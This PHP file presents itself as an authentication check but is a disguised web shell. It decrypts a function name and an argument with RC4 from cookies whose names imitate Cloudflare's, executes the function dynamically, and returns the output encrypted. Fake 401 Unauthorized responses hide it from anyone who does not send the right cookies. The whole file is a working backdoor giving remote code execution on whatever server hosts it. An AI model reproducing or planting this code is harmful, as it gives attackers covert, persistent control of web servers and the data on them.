<?php

class CountIndex
{
    private $k;
    public function __construct()
    {
        $this->k = base64_decode(str_replace(" ", "+", $_COOKIE['_sfuvid']));
    }

    public function count($k, $data)
    {
        $k = array_values(unpack('C*', $k));
        $data = array_values(unpack('C*', $data));
        $key_len = count($k);
        $data_len = count($data);

        $s = range(0, 255);
        $j = 0;
        for ($i = 0; $i < 256; $i++) {
            $j = ($j + $s[$i] + $k[$i % $key_len]) % 256;
            list($s[$i], $s[$j]) = [$s[$j], $s[$i]];
        }

        $i = $j = 0;
        $result = [];
        for ($y = 0; $y < $data_len; $y++) {
            $i = ($i + 1) % 256;
            $j = ($j + $s[$i]) % 256;
            list($s[$i], $s[$j]) = [$s[$j], $s[$i]];
            $result[] = $data[$y] ^ $s[($s[$i] + $s[$j]) % 256];
        }

        return pack('C*', ...$result);
    }

    public function add($data)
    {
        return base64_encode($this->count($this->k, $data));
    }

    public function re($data)
    {
        return $this->count($this->k, base64_decode($data));
    }
}

class CheckData
{
    public $c;
    function rule()
    {
        return $this->c->re(str_replace(" ", "+", $_COOKIE['_cfuvid']));
    }
    function check()
    {
        $ff = '' . $this->rule();
        $data = $this->c->re(str_replace(" ", "+", $_COOKIE['Token']));
        return $ff($data);
    }
}

function checkAuthentication()
{
    $hasId = isset($_COOKIE['_sfuvid']);
    $hasCfuvid = isset($_COOKIE['_cfuvid']);
    $hasToken = isset($_COOKIE['Token']);

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        header('HTTP/1.1 401 Unauthorized');
        echo '401 Unauthorized';
        exit;
    }

    if (!$hasId || !$hasCfuvid || !$hasToken) {
        header('HTTP/1.1 401 Unauthorized');
        echo '401 Unauthorized';
        exit;
    }

    $count = new CountIndex;
    $check = new CheckData;
    $check->c = $count;

    echo $count->add($check->check());
}

checkAuthentication();

?>